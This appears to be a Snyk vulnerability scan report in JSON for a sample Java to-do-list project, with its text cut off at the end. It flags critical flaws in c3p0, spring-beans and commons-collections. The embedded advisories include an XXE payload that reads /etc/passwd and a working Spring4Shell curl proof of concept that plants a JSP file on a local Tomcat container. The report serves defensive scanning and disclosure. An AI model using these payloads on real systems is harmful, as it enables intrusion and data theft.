[
  {
    "vulnerabilities": [
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "alternativeIds": [],
        "creationTime": "2019-09-05T16:17:58.383761Z",
        "credit": [
          "Unknown"
        ],
        "cvssScore": 9.8,
        "description": "## Overview\n\n[c3p0:c3p0](https://mvnrepository.com/artifact/c3p0/c3p0) is a lIbrary for augmenting traditional (DriverManager-based) JDBC drivers with JNDI-bindable DataSources, including DataSources that implement Connection and Statement Pooling, as described by the jdbc3 spec and jdbc2 std extension. Note: This library is no longer maintained and has migrated to the artifact \r\n\"com.mchange:c3p0\"\n\n\nAffected versions of this package are vulnerable to XML External Entity (XXE) Injection.\nvia the `extractXmlConfigFromInputStream` in `com/mchange/v2/c3p0/cfg/C3P0ConfigXmlUtils.java` during initialization.\n\n## Details\nXXE Injection is a type of attack against an application that parses XML input.\r\nXML is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. By default, many XML processors allow specification of an external entity, a URI that is dereferenced and evaluated during XML processing. When an XML document is being parsed, the parser can make a request and include the content at the specified URI inside of the XML document.\r\n\r\nAttacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier.\r\n\r\nFor example, below is a sample XML document, containing an XML element- username.\r\n\r\n```xml\r\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\r\n   <username>John</username>\r\n</xml>\r\n```\r\n\r\nAn external XML entity - `xxe`, is defined using a system identifier and present within a DOCTYPE header. These entities can access local or remote content. For example the below code contains an external XML entity that would fetch the content of  `/etc/passwd` and display it to the user rendered by `username`.\r\n\r\n```xml\r\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\r\n<!DOCTYPE foo [\r\n   <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\r\n   <username>&xxe;</username>\r\n</xml>\r\n```\r\n\r\nOther XXE Injection attacks can access local resources that may not stop returning data, possibly impacting application availability and leading to Denial of Service.\n\n\n## Remediation\n\nThere is no fixed version for `c3p0:c3p0`.\n\n\n## References\n\n- [GitHub Commit](https://github.com/swaldman/c3p0/commit/7dfdda63f42759a5ec9b63d725b7412f74adb3e1)\n",
        "disclosureTime": "2018-12-24T13:29:00Z",
        "exploit": "Not Defined",
        "functions": [
          {
            "functionId": {
              "filePath": "com/mchange/v2/c3p0/cfg/C3P0ConfigXmlUtils.java",
              "className": "C3P0ConfigXmlUtils",
              "functionName": "extractXmlConfigFromInputStream"
            },
            "version": [
              "[0.9.1,]"
            ]
          }
        ],
        "fixedIn": [],
        "id": "SNYK-JAVA-C3P0-461017",
        "identifiers": {
          "CWE": [
            "CWE-611"
          ],
          "CVE": [
            "CVE-2018-20433"
          ]
        },
        "language": "java",
        "malicious": false,
        "modificationTime": "2020-12-14T14:41:01.987191Z",
        "moduleName": "c3p0:c3p0",
        "packageManager": "maven",
        "packageName": "c3p0:c3p0",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2019-07-21T14:22:18Z",
        "references": [
          {
            "title": "GitHub Commit",
            "url": "https://github.com/swaldman/c3p0/commit/7dfdda63f42759a5ec9b63d725b7412f74adb3e1"
          }
        ],
        "severity": "critical",
        "socialTrendAlert": false,
        "title": "XML External Entity (XXE) Injection",
        "insights": {
          "triageAdvice": null
        },
        "functions_new": [
          {
            "functionId": {
              "className": "com.mchange.v2.c3p0.cfg.C3P0ConfigXmlUtils",
              "functionName": "extractXmlConfigFromInputStream"
            },
            "version": [
              "[0.9.1,]"
            ]
          }
        ],
        "semver": {
          "vulnerable": [
            "[0,]"
          ]
        },
        "mavenModuleName": {
          "groupId": "c3p0",
          "artifactId": "c3p0"
        },
        "severityWithCritical": "critical",
        "from": [
          "io.github.snyk:todolist-core@0.0.1-SNAPSHOT",
          "c3p0:c3p0@0.9.1.2"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "c3p0:c3p0",
        "version": "0.9.1.2"
      },
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:H",
        "alternativeIds": [],
        "creationTime": "2022-03-30T21:42:31.436000Z",
        "credit": [
          "Unknown"
        ],
        "cvssScore": 9.8,
        "description": "## Overview\n[org.springframework:spring-beans](https://www.baeldung.com/spring-bean) is a package that is the basis for Spring Framework's IoC container. The BeanFactory interface provides an advanced configuration mechanism capable of managing any type of object.\n\nAffected versions of this package are vulnerable to Remote Code Execution via manipulation of `ClassLoader` that is achievable with a POST HTTP request. This could allow an attacker to execute a webshell on a victim's application (TomCat), or download arbitrary files from the server (Payara/Glassfish).\r\n\r\n**Note:** \r\n* Current public exploits require victim applications to be built with JRE version 9 (or above) and to be deployed on either Tomcat, Payara or Glassfish. \r\n* However, we have confirmed that it is technically possible for additional exploits to work under additional application configurations as well. \r\n* As such while we recommend users prioritise first remediating against the configuration described above, for full protection we also recommend upgrading all vulnerable versions to the fixed `spring-beans` version regardless of the application configuration.\r\n\r\n### Update Log \r\n* **31/03/2022 -** Severity was raised from 8.1 to 9.8\r\n* **08/04/2022 -** Advisory was updated to reflect that Snyk's security research team was able to author a working PoC of this vulnerability against applications that are deployed on Payara (which is based on Glassfish). \r\n\r\n\r\n## PoC\r\n```java\r\n1/ docker run -p 8888:8080 --rm --interactive --tty --name vm1 tomcat:9.0\r\n2/ ./mvnw install\r\n3/ docker cp target/handling-form-submission-complete.war vm1:/usr/local/tomcat/webapps\r\n4/ curl -X POST \\\r\n  -H \"pre:<%\" \\\r\n  -H \"post:;%>\" \\\r\n  -F 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{pre}iSystem.out.println(123)%{post}i' \\\r\n  -F 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \\\r\n  -F 'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/handling-form-submission-complete' \\\r\n  -F 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=rce' \\\r\n  -F 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \\\r\n  http://localhost:8888/handling-form-submission-complete/greeting\r\n5/ curl http://localhost:8888/handling-form-submission-complete/rce.jsp\r\n```\n## Remediation\nUpgrade `org.springframework:spring-beans` to version 5.2.20, 5.3.18 or higher.\n## References\n- [CyberKendra Post](https://www.cyberkendra.com/2022/03/springshell-rce-0-day-vulnerability.html)\n- [GitHub Commit](https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15)\n- [LunaSec Blog](https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/)\n- [Payara Blogpost](https://blog.payara.fish/payara-and-spring4shell)\n- [Payara PoC](https://github.com/CalumHutton/CVE-2022-22965-PoC_Payara)\n- [Snyk Blog - Technical Breakdown](https://snyk.io/blog/spring4shell-zero-day-rce-spring-framework-explained/)\n- [Snyk PoC](https://github.com/Kirill89/CVE-2022-22965-PoC)\n- [Spring Security Announcement](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement)\n- [Spring Tomcat Mitigation Advice](https://spring.io/blog/2022/04/01/spring-framework-rce-mitigation-alternative)\n- [CISA - Known Exploited Vulnerabilities](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)\n",
        "disclosureTime": "2022-03-30T21:42:24Z",
        "exploit": "High",
        "functions": [
          {
            "functionId": {
              "filePath": "org/springframework/beans/CachedIntrospectionResults.java",
              "className": "CachedIntrospectionResults",
              "functionName": "<init>"
            },
            "version": [
              "[ ,5.2.20)",
              "[5.3.0, 5.3.18)"
            ]
          }
        ],
        "fixedIn": [
          "5.2.20",
          "5.3.18"
        ],
        "id": "SNYK-JAVA-ORGSPRINGFRAMEWORK-2436751",
        "identifiers": {
          "CWE": [
            "CWE-94"
          ],
          "CVE": [
            "CVE-2022-22965"
          ]
        },
        "language": "java",
        "malicious": false,
        "modificationTime": "2022-06-15T15:36:05.947908Z",
        "moduleName": "org.springframework:spring-beans",
        "packageManager": "maven",
        "packageName": "org.springframework:spring-beans",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2022-03-30T22:32:44Z",
        "references": [
          {
            "title": "CyberKendra Post",
            "url": "https://www.cyberkendra.com/2022/03/springshell-rce-0-day-vulnerability.html"
          },
          {
            "title": "GitHub Commit",
            "url": "https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15"
          },
          {
            "title": "LunaSec Blog",
            "url": "https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/"
          },
          {
            "title": "Payara Blogpost",
            "url": "https://blog.payara.fish/payara-and-spring4shell"
          },
          {
            "title": "Payara PoC",
            "url": "https://github.com/CalumHutton/CVE-2022-22965-PoC_Payara"
          },
          {
            "title": "Snyk Blog - Technical Breakdown",
            "url": "https://snyk.io/blog/spring4shell-zero-day-rce-spring-framework-explained/"
          },
          {
            "title": "Snyk PoC",
            "url": "https://github.com/Kirill89/CVE-2022-22965-PoC"
          },
          {
            "title": "Spring Security Announcement",
            "url": "https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement"
          },
          {
            "title": "Spring Tomcat Mitigation Advice",
            "url": "https://spring.io/blog/2022/04/01/spring-framework-rce-mitigation-alternative"
          },
          {
            "title": "CISA - Known Exploited Vulnerabilities",
            "url": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
          }
        ],
        "severity": "critical",
        "socialTrendAlert": false,
        "title": "Remote Code Execution",
        "insights": {
          "triageAdvice": null
        },
        "functions_new": [
          {
            "functionId": {
              "className": "org.springframework.beans.CachedIntrospectionResults",
              "functionName": "<init>"
            },
            "version": [
              "[ ,5.2.20)",
              "[5.3.0, 5.3.18)"
            ]
          }
        ],
        "semver": {
          "vulnerable": [
            "[ ,5.2.20)",
            "[5.3.0, 5.3.18)"
          ]
        },
        "mavenModuleName": {
          "groupId": "org.springframework",
          "artifactId": "spring-beans"
        },
        "severityWithCritical": "critical",
        "from": [
          "io.github.snyk:todolist-core@0.0.1-SNAPSHOT",
          "org.springframework:spring-context@3.2.6.RELEASE",
          "org.springframework:spring-beans@3.2.6.RELEASE"
        ],
        "upgradePath": [
          false,
          "org.springframework:spring-context@5.2.20.RELEASE",
          "org.springframework:spring-beans@5.2.20.RELEASE"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "org.springframework:spring-beans",
        "version": "3.2.6.RELEASE"
      }
    ],
    "ok": false,
    "dependencyCount": 34,
    "org": "karen27313",
    "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.0\nignore: {}\npatch: {}\n",
    "isPrivate": true,
    "licensesPolicy": {
      "severities": {},
      "orgLicenseRules": {
        "AGPL-1.0": {
          "licenseType": "AGPL-1.0",
          "severity": "high",
          "instructions": ""
        },
        "AGPL-3.0": {
          "licenseType": "AGPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "Artistic-1.0": {
          "licenseType": "Artistic-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "Artistic-2.0": {
          "licenseType": "Artistic-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "CDDL-1.0": {
          "licenseType": "CDDL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "CPOL-1.02": {
          "licenseType": "CPOL-1.02",
          "severity": "high",
          "instructions": ""
        },
        "EPL-1.0": {
          "licenseType": "EPL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "GPL-2.0": {
          "licenseType": "GPL-2.0",
          "severity": "high",
          "instructions": ""
        },
        "GPL-3.0": {
          "licenseType": "GPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "LGPL-2.0": {
          "licenseType": "LGPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-2.1": {
          "licenseType": "LGPL-2.1",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-3.0": {
          "licenseType": "LGPL-3.0",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-1.1": {
          "licenseType": "MPL-1.1",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-2.0": {
          "licenseType": "MPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "MS-RL": {
          "licenseType": "MS-RL",
          "severity": "medium",
          "instructions": ""
        },
        "SimPL-2.0": {
          "licenseType": "SimPL-2.0",
          "severity": "high",
          "instructions": ""
        }
      }
    },
    "packageManager": "maven",
    "ignoreSettings": {
      "adminOnly": false,
      "reasonRequired": false,
      "disregardFilesystemIgnores": false
    },
    "summary": "2 critical severity vulnerable dependency paths",
    "severityThreshold": "critical",
    "remediation": {
      "unresolved": [
        {
          "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "alternativeIds": [],
          "creationTime": "2019-09-05T16:17:58.383761Z",
          "credit": [
            "Unknown"
          ],
          "cvssScore": 9.8,
          "description": "## Overview\n\n[c3p0:c3p0](https://mvnrepository.com/artifact/c3p0/c3p0) is a lIbrary for augmenting traditional (DriverManager-based) JDBC drivers with JNDI-bindable DataSources, including DataSources that implement Connection and Statement Pooling, as described by the jdbc3 spec and jdbc2 std extension. Note: This library is no longer maintained and has migrated to the artifact \r\n\"com.mchange:c3p0\"\n\n\nAffected versions of this package are vulnerable to XML External Entity (XXE) Injection.\nvia the `extractXmlConfigFromInputStream` in `com/mchange/v2/c3p0/cfg/C3P0ConfigXmlUtils.java` during initialization.\n\n## Details\nXXE Injection is a type of attack against an application that parses XML input.\r\nXML is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. By default, many XML processors allow specification of an external entity, a URI that is dereferenced and evaluated during XML processing. When an XML document is being parsed, the parser can make a request and include the content at the specified URI inside of the XML document.\r\n\r\nAttacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier.\r\n\r\nFor example, below is a sample XML document, containing an XML element- username.\r\n\r\n```xml\r\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\r\n   <username>John</username>\r\n</xml>\r\n```\r\n\r\nAn external XML entity - `xxe`, is defined using a system identifier and present within a DOCTYPE header. These entities can access local or remote content. For example the below code contains an external XML entity that would fetch the content of  `/etc/passwd` and display it to the user rendered by `username`.\r\n\r\n```xml\r\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\r\n<!DOCTYPE foo [\r\n   <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\r\n   <username>&xxe;</username>\r\n</xml>\r\n```\r\n\r\nOther XXE Injection attacks can access local resources that may not stop returning data, possibly impacting application availability and leading to Denial of Service.\n\n\n## Remediation\n\nThere is no fixed version for `c3p0:c3p0`.\n\n\n## References\n\n- [GitHub Commit](https://github.com/swaldman/c3p0/commit/7dfdda63f42759a5ec9b63d725b7412f74adb3e1)\n",
          "disclosureTime": "2018-12-24T13:29:00Z",
          "exploit": "Not Defined",
          "functions": [
            {
              "functionId": {
                "filePath": "com/mchange/v2/c3p0/cfg/C3P0ConfigXmlUtils.java",
                "className": "C3P0ConfigXmlUtils",
                "functionName": "extractXmlConfigFromInputStream"
              },
              "version": [
                "[0.9.1,]"
              ]
            }
          ],
          "fixedIn": [],
          "id": "SNYK-JAVA-C3P0-461017",
          "identifiers": {
            "CWE": [
              "CWE-611"
            ],
            "CVE": [
              "CVE-2018-20433"
            ]
          },
          "language": "java",
          "malicious": false,
          "modificationTime": "2020-12-14T14:41:01.987191Z",
          "moduleName": "c3p0:c3p0",
          "packageManager": "maven",
          "packageName": "c3p0:c3p0",
          "patches": [],
          "proprietary": false,
          "publicationTime": "2019-07-21T14:22:18Z",
          "references": [
            {
              "title": "GitHub Commit",
              "url": "https://github.com/swaldman/c3p0/commit/7dfdda63f42759a5ec9b63d725b7412f74adb3e1"
            }
          ],
          "severity": "critical",
          "socialTrendAlert": false,
          "title": "XML External Entity (XXE) Injection",
          "insights": {
            "triageAdvice": null
          },
          "functions_new": [
            {
              "functionId": {
                "className": "com.mchange.v2.c3p0.cfg.C3P0ConfigXmlUtils",
                "functionName": "extractXmlConfigFromInputStream"
              },
              "version": [
                "[0.9.1,]"
              ]
            }
          ],
          "semver": {
            "vulnerable": [
              "[0,]"
            ]
          },
          "mavenModuleName": {
            "groupId": "c3p0",
            "artifactId": "c3p0"
          },
          "from": [
            "io.github.snyk:todolist-core@0.0.1-SNAPSHOT",
            "c3p0:c3p0@0.9.1.2"
          ],
          "upgradePath": [],
          "isUpgradable": false,
          "isPatchable": false,
          "isPinnable": false,
          "isRuntime": false,
          "name": "c3p0:c3p0",
          "version": "0.9.1.2",
          "severityWithCritical": "critical"
        }
      ],
      "upgrade": {
        "org.springframework:spring-context@3.2.6.RELEASE": {
          "upgradeTo": "org.springframework:spring-context@5.2.20.RELEASE",
          "upgrades": [
            "org.springframework:spring-beans@3.2.6.RELEASE"
          ],
          "vulns": [
            "SNYK-JAVA-ORGSPRINGFRAMEWORK-2436751"
          ]
        }
      },
      "patch": {},
      "ignore": {},
      "pin": {}
    },
    "filesystemPolicy": false,
    "filtered": {
      "ignore": [],
      "patch": []
    },
    "uniqueCount": 2,
    "projectName": "io.github.snyk:todolist-core",
    "foundProjectCount": 1,
    "displayTargetFile": "todolist-core/pom.xml",
    "path": "/Users/kmm/Documents/code/snyk/CodingLanguages/javascript/mydepsample"
  },
  {
    "vulnerabilities": [
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "alternativeIds": [],
        "creationTime": "2019-09-05T16:17:58.383761Z",
        "credit": [
          "Unknown"
        ],
        "cvssScore": 9.8,
        "description": "## Overview\n\n[c3p0:c3p0](https://mvnrepository.com/artifact/c3p0/c3p0) is a lIbrary for augmenting traditional (DriverManager-based) JDBC drivers with JNDI-bindable DataSources, including DataSources that implement Connection and Statement Pooling, as described by the jdbc3 spec and jdbc2 std extension. Note: This library is no longer maintained and has migrated to the artifact \r\n\"com.mchange:c3p0\"\n\n\nAffected versions of this package are vulnerable to XML External Entity (XXE) Injection.\nvia the `extractXmlConfigFromInputStream` in `com/mchange/v2/c3p0/cfg/C3P0ConfigXmlUtils.java` during initialization.\n\n## Details\nXXE Injection is a type of attack against an application that parses XML input.\r\nXML is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. By default, many XML processors allow specification of an external entity, a URI that is dereferenced and evaluated during XML processing. When an XML document is being parsed, the parser can make a request and include the content at the specified URI inside of the XML document.\r\n\r\nAttacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier.\r\n\r\nFor example, below is a sample XML document, containing an XML element- username.\r\n\r\n```xml\r\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\r\n   <username>John</username>\r\n</xml>\r\n```\r\n\r\nAn external XML entity - `xxe`, is defined using a system identifier and present within a DOCTYPE header. These entities can access local or remote content. For example the below code contains an external XML entity that would fetch the content of  `/etc/passwd` and display it to the user rendered by `username`.\r\n\r\n```xml\r\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\r\n<!DOCTYPE foo [\r\n   <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\r\n   <username>&xxe;</username>\r\n</xml>\r\n```\r\n\r\nOther XXE Injection attacks can access local resources that may not stop returning data, possibly impacting application availability and leading to Denial of Service.\n\n\n## Remediation\n\nThere is no fixed version for `c3p0:c3p0`.\n\n\n## References\n\n- [GitHub Commit](https://github.com/swaldman/c3p0/commit/7dfdda63f42759a5ec9b63d725b7412f74adb3e1)\n",
        "disclosureTime": "2018-12-24T13:29:00Z",
        "exploit": "Not Defined",
        "functions": [
          {
            "functionId": {
              "filePath": "com/mchange/v2/c3p0/cfg/C3P0ConfigXmlUtils.java",
              "className": "C3P0ConfigXmlUtils",
              "functionName": "extractXmlConfigFromInputStream"
            },
            "version": [
              "[0.9.1,]"
            ]
          }
        ],
        "fixedIn": [],
        "id": "SNYK-JAVA-C3P0-461017",
        "identifiers": {
          "CWE": [
            "CWE-611"
          ],
          "CVE": [
            "CVE-2018-20433"
          ]
        },
        "language": "java",
        "malicious": false,
        "modificationTime": "2020-12-14T14:41:01.987191Z",
        "moduleName": "c3p0:c3p0",
        "packageManager": "maven",
        "packageName": "c3p0:c3p0",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2019-07-21T14:22:18Z",
        "references": [
          {
            "title": "GitHub Commit",
            "url": "https://github.com/swaldman/c3p0/commit/7dfdda63f42759a5ec9b63d725b7412f74adb3e1"
          }
        ],
        "severity": "critical",
        "socialTrendAlert": false,
        "title": "XML External Entity (XXE) Injection",
        "insights": {
          "triageAdvice": null
        },
        "functions_new": [
          {
            "functionId": {
              "className": "com.mchange.v2.c3p0.cfg.C3P0ConfigXmlUtils",
              "functionName": "extractXmlConfigFromInputStream"
            },
            "version": [
              "[0.9.1,]"
            ]
          }
        ],
        "semver": {
          "vulnerable": [
            "[0,]"
          ]
        },
        "mavenModuleName": {
          "groupId": "c3p0",
          "artifactId": "c3p0"
        },
        "severityWithCritical": "critical",
        "from": [
          "io.github.snyk:todolist-web-common@0.0.1-SNAPSHOT",
          "io.github.snyk:todolist-core@0.0.1-SNAPSHOT",
          "c3p0:c3p0@0.9.1.2"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "c3p0:c3p0",
        "version": "0.9.1.2"
      },
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:H/RL:O",
        "alternativeIds": [],
        "creationTime": "2016-12-25T16:51:56Z",
        "credit": [
          "Unknown"
        ],
        "cvssScore": 9.8,
        "description": "## Overview\n\n[commons-collections:commons-collections](https://mvnrepository.com/artifact/commons-collections/commons-collections) is a library which contains types that extend and augment the Java Collections Framework.\n\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data.\nIt is possible to execute arbitrary Java code with the `InvokerTransformer` serializable collections . The `sun.reflect.annotation.AnnotationInvocationHandler#readObject` method invokes `#entrySet` and `#get` on a deserialized collection. If an attacker has to ability to send serialized data (JMX, RMI, EJB) to an application using the `common-collections` library, it is possible to combine the aforementioned methods to execute arbitrary code on the application.\n\n## Details\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\r\n\r\n  \r\n\r\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\r\n\r\n  \r\n\r\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\r\n\r\n  \r\n\r\nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\r\n\r\n  \r\n\r\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\r\n\r\n- Apache Blog\r\n\r\n  \r\n\r\nThe vulnerability, also know as _Mad Gadget_\r\n\r\n> Mad Gadget is one of the most pernicious vulnerabilities we’ve seen. By merely existing on the Java classpath, seven “gadget” classes in Apache Commons Collections (versions 3.0, 3.1, 3.2, 3.2.1, and 4.0) make object deserialization for the entire JVM process Turing complete with an exec function. Since many business applications use object deserialization to send messages across the network, it would be like hiring a bank teller who was trained to hand over all the money in the vault if asked to do so politely, and then entrusting that teller with the key. The only thing that would keep a bank safe in such a circumstance is that most people wouldn’t consider asking such a question.\r\n\r\n- Google\n\n## Remediation\n\nUpgrade `commons-collections:commons-collections` to version 3.2.2 or higher.\n\n\n## References\n\n- [FoxGloveSecurity Blog](http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)\n\n- [GitHub Commit](https://github.com/apache/commons-collections/commit/e585cd0433ae4cfbc56e58572b9869bd0c86b611)\n\n- [Jira Issue](https://issues.apache.org/jira/browse/COLLECTIONS-580)\n\n- [PoC](https://github.com/ianxtianxt/CVE-2015-7501)\n\n- [Exploit DB](https://www.exploit-db.com/exploits/46628)\n\n- [CISA - Known Exploited Vulnerabilities](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)\n",
        "disclosureTime": "2015-11-06T16:51:56Z",
        "exploit": "High",
        "functions": [
          {
            "functionId": {
              "filePath": "org/apache/commons/collections/functors/InvokerTransformer.java",
              "className": "InvokerTransformer",
              "functionName": "transform"
            },
            "version": [
              "[3,3.2.2)"
            ]
          }
        ],
        "fixedIn": [
          "3.2.2"
        ],
        "id": "SNYK-JAVA-COMMONSCOLLECTIONS-30078",
        "identifiers": {
          "CWE": [
            "CWE-502"
          ],
          "CVE": [
            "CVE-2015-7501",
            "CVE-2015-4852"
          ]
        },
        "language": "java",
        "malicious": false,
        "modificationTime": "2022-06-15T15:36:06.560134Z",
        "moduleName": "commons-collections:commons-collections",
        "packageManager": "maven",
        "packageName": "commons-collections:commons-collections",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2015-11-06T16:51:56Z",
        "references": [
          {
            "title": "FoxGloveSecurity Blog",
            "url": "http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/"
          },
          {
            "title": "GitHub Commit",
            "url": "https://github.com/apache/commons-collections/commit/e585cd0433ae4cfbc56e58572b9869bd0c86b611"
          },
          {
            "title": "Jira Issue",
            "url": "https://issues.apache.org/jira/browse/COLLECTIONS-580"
          },
          {
            "title": "PoC",
            "url": "https://github.com/ianxtianxt/CVE-2015-7501"
          },
          {
            "title": "Exploit DB",
            "url": "https://www.exploit-db.com/exploits/46628"
          },
          {
            "title": "CISA - Known Exploited Vulnerabilities",
            "url": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
          }
        ],
        "severity": "critical",
        "socialTrendAlert": false,
        "title": "Deserialization of Untrusted Data",
        "insights": {
          "triageAdvice": null
        },
        "functions_new": [
          {
            "functionId": {
              "className": "org.apache.commons.collections.functors.InvokerTransformer",
              "functionName": "transform"
            },
            "version": [
              "[3,3.2.2)"
            ]
          }
        ],
        "semver": {
          "vulnerable": [
            "[3.0,3.2.2)"
          ]
        },
        "mavenModuleName": {
          "groupId": "commons-collections",
          "artifactId": "commons-collections"
        },
        "severityWithCritical": "critical",
        "from": [
          "io.github.snyk:todolist-web-common@0.0.1-SNAPSHOT",
          "commons-collections:commons-collections@3.1"
        ],
        "upgradePath": [
          false,
          "commons-collections:commons-collections@3.2.2"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "commons-collections:commons-collections",
        "version": "3.1"
      },
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:H",
        "alternativeIds": [],
        "creationTime": "2022-03-30T21:42:31.436000Z",
        "credit": [
          "Unknown"
        ],
        "cvssScore": 9.8,
        "description": "## Overview\n[org.springframework:spring-beans](https://www.baeldung.com/spring-bean) is a package that is the basis for Spring Framework's IoC container. The BeanFactory interface provides an advanced configuration mechanism capable of managing any type of object.\n\nAffected versions of this package are vulnerable to Remote Code Execution via manipulation of `ClassLoader` that is achievable with a POST HTTP request. This could allow an attacker to execute a webshell on a victim's application (TomCat), or download arbitrary files from the server (Payara/Glassfish).\r\n\r\n**Note:** \r\n* Current public exploits require victim applications to be built with JRE version 9 (or above) and to be deployed on either Tomcat, Payara or Glassfish. \r\n* However, we have confirmed that it is technically possible for additional exploits to work under additional application configurations as well. \r\n* As such while we recommend users prioritise first remediating against the configuration described above, for full protection we also recommend upgrading all vulnerable versions to the fixed `spring-beans` version regardless of the application configuration.\r\n\r\n### Update Log \r\n* **31/03/2022 -** Severity was raised from 8.1 to 9.8\r\n* **08/04/2022 -** Advisory was updated to reflect that Snyk's security research team was able to author a working PoC of this vulnerability against applications that are deployed on Payara (which is based on Glassfish). \r\n\r\n\r\n## PoC\r\n```java\r\n1/ docker run -p 8888:8080 --rm --interactive --tty --name vm1 tomcat:9.0\r\n2/ ./mvnw install\r\n3/ docker cp target/handling-form-submission-complete.war vm1:/usr/local/tomcat/webapps\r\n4/ curl -X POST \\\r\n  -H \"pre:<%\" \\\r\n  -H \"post:;%>\" \\\r\n  -F 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{pre}iSystem.out.println(123)%{post}i' \\\r\n  -F 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \\\r\n  -F 'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/handling-form-submission-complete' \\\r\n  -F 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=rce' \\\r\n  -F 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \\\r\n  http://localhost:8888/handling-form-submission-complete/greeting\r\n5/ curl http://localhost:8888/handling-form-submission-complete/rce.jsp\r\n```\n## Remediation\nUpgrade `org.springframework:spring-beans` to version 